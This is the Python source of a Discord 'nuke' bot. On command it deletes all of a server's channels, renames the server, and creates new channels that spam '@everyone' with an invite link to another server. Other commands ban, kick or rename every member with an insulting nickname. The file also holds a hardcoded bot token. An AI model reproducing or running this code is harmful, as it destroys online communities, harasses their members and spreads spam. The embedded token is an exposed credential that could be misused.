import discord, asyncio

from discord.ext import commands

from aiohttp import ClientSession

import os

from web import keep_alive

keep_alive()

command_prefix = '!'

nuke_channel_name = 'nuked'

nuke_channel_amount = 10

spam_text = '@everyone СЕРВЕР ПЕРЕЕЗЖАЕТ --> https://discord.gg/34KcF7MjFc'

nuke_spam_amount = 5

nuke_guild_name = 'nuked'

nuke_member_nick = 'gay'

logs_webhook_url = ''

guilds_whitelist = []

intents = discord.Intents.all()

client = commands.Bot(command_prefix=command_prefix, intents=intents)

async def deleteChannels(ctx):

  await asyncio.gather(*[asyncio.create_task(channel.delete()) for channel in ctx.guild.channels])

async def deleteRoles(ctx):

  for role in ctx.guild.roles:

    asyncio.create_task(role.delete())

async def deleteEmojis(ctx):

  for emote in ctx.guild.emojis:

    asyncio.create_task(emote.delete())

async def editGuild(ctx):

  asyncio.create_task(ctx.guild.edit(name=nuke_guild_name, icon=None))

async def createChannels(ctx):

  for _ in range(nuke_channel_amount):

    asyncio.create_task(ctx.guild.create_text_channel(nuke_channel_name))

@client.command()

async def banAll(ctx):

  for member in ctx.guild.members:

    asyncio.create_task(member.ban())

@client.command()

async def kickAll(ctx):

  for member in ctx.guild.members:

    asyncio.create_task(member.kick())

@client.command()

async def renameAll(ctx):

  for member in ctx.guild.members:

    asyncio.create_task(member.edit(name=nuke_member_nick))

@client.command(aliases=['crash'])

async def nuke(ctx):

  if ctx.guild.id in guilds_whitelist:

    return

  await deleteChannels(ctx)

  

  await editGuild(ctx)

  await createChannels(ctx)

@client.event

async def on_guild_channel_create(channel):

  for _ in range(nuke_spam_amount):

    asyncio.create_task(channel.send(spam_text))

token = 'OTIyMTI5NTE3MzU3NzA3MzE1.GUxJzu.i-dbXaRuc7a2MbKu4KMBm-VcxtB0g7DaElPEEU'

client.run(token)

